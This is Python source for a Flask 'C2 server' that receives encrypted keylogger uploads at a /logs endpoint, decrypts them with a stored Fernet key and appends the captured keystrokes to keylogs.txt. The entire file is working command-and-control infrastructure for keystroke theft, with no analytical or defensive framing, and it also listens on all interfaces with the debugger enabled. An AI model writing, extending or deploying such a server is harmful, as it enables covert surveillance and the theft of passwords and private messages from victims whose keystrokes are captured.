from flask import Flask, request
from cryptography.fernet import Fernet
import logging

def load_key():
    with open("encryption.key", "rb") as key_file:
        return key_file.read()

ENCRYPTION_KEY = load_key()
LOG_FILE = "keylogs.txt"

app = Flask(__name__)
cipher_suite = Fernet(ENCRYPTION_KEY)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def decrypt_data(encrypted_data):
    try:
        return cipher_suite.decrypt(encrypted_data).decode()
    except Exception as e:
        print(f"Decryption error: {e}")
        return None

@app.route('/logs', methods=['POST'])
def receive_logs():
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    
    if decrypted_data:
        print(f"Received logs: {decrypted_data}")
        with open(LOG_FILE, "a") as f:
            f.write(decrypted_data + "\n")
        return "Logs received", 200
    else:
        return "Decryption failed", 400

if __name__ == "__main__":
    print(f"C2 server running. Logs will be saved to {LOG_FILE}")
    app.run(host='0.0.0.0', port=8080, debug=True)  # Added debug=True